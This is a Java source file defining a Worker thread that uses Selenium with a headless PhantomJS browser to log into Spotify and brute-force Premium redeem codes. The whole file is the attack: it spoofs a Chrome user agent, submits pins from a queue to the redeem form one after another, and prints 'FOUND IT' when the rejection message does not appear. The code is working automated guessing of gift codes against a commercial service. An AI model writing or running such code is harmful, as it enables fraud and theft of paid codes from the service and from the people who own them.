import eu.bitwalker.useragentutils.UserAgent;

import org.apache.http.HttpException;
import org.apache.http.HttpResponse;
import org.apache.http.HttpResponseInterceptor;
import org.apache.http.protocol.HttpContext;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.phantomjs.PhantomJSDriver;
import org.openqa.selenium.phantomjs.PhantomJSDriverService;
import org.openqa.selenium.remote.CapabilityType;
import org.openqa.selenium.remote.DesiredCapabilities;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.BlockingQueue;

/**
 * Created by gurkiratsingh on 7/6/16.
 */
class Worker extends Thread {
    private static final String BASE_URL = "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F";
    private static final String EVAL_STRING = "Unfortunately this Premium code";

    protected BlockingQueue<String> queue;
    private WebDriver driver;
    private WebDriverWait wait;

    public Worker(BlockingQueue<String> q){
        this.queue = q;
        initDriver();
        loginAndRedirect();
    }

    public void run(){

        try {
            while (!queue.isEmpty()) {
                String pin = queue.take();
                WebElement token_elem = driver.findElement(By.name("token"));
                token_elem.clear();
                token_elem.sendKeys(pin);
                token_elem.sendKeys(Keys.RETURN);

                if (isFound()){
                    System.out.println(String.format("%s %s", "FOUND IT:", pin));
                }else{
                    System.out.println(String.format("%s %s", "FAILED:", pin));
                }
            }
        }catch (InterruptedException e){
            System.out.println(e.getMessage());
        }finally {
            driver.quit();
            queue = null;
        }
    }
    private void initDriver(){
        DesiredCapabilities capabilities =   DesiredCapabilities.phantomjs();
        capabilities.setCapability(PhantomJSDriverService.PHANTOMJS_EXECUTABLE_PATH_PROPERTY,
                Redeemer.PHANTOM_EXE);
        capabilities.setJavascriptEnabled(true);

        LocalUserAgent localurg = new LocalUserAgent();
        String useragent = localurg.getUserAgent();
        UserAgent ua_parser = UserAgent.parseUserAgentString(useragent);
        String browser_version = String.valueOf(ua_parser.getBrowserVersion());
        String platform = String.valueOf(ua_parser.getOperatingSystem()).toLowerCase();

        capabilities.setBrowserName("Chrome");
        capabilities.setVersion(browser_version);

        if (platform.contains("mac")){
            capabilities.setPlatform(Platform.MAC);
        }else if (platform.contains("linux")){
            capabilities.setPlatform(Platform.LINUX);
        }else{
            capabilities.setPlatform(Platform.WINDOWS);
        }

        capabilities.setCapability("phantomjs.page.settings.userAgent", useragent);
        driver = new PhantomJSDriver(capabilities);
        driver.manage().window().setSize(new Dimension(1000, 1000));

    }

    private void loginAndRedirect(){
        try {
            driver.get(BASE_URL);
            wait = new WebDriverWait(driver, 20);

            WebElement user_elem = wait.until(
                    ExpectedConditions.presenceOfElementLocated(By.name("username"))

            );
            user_elem.sendKeys(Redeemer.USERNAME);

            WebElement pass_elem = wait.until(
                    ExpectedConditions.presenceOfElementLocated(By.name("password"))
            );
            pass_elem.sendKeys(Redeemer.PASSWORD);
            pass_elem.sendKeys(Keys.RETURN);
            wait.until(
                    ExpectedConditions.presenceOfElementLocated(By.partialLinkText("Redeem"))
            ).click();
        }catch (Exception e){
            System.out.println(e.getMessage());
        }

    }

    private Boolean isFound(){
        try{
            WebElement elem = wait.until(
                    ExpectedConditions.visibilityOfElementLocated(By.className("error-container"))
            );

            if (elem.getText().contains(EVAL_STRING)){
                return false;
            }else if (elem.getText().equalsIgnoreCase("Oops! Something went wrong, please try again.")) {
                return false;
            }else{
                System.out.println(elem.getText());
                return true;
            }
        }catch(Exception e){
            System.out.println(e.getMessage());
            return false;
        }
    }

}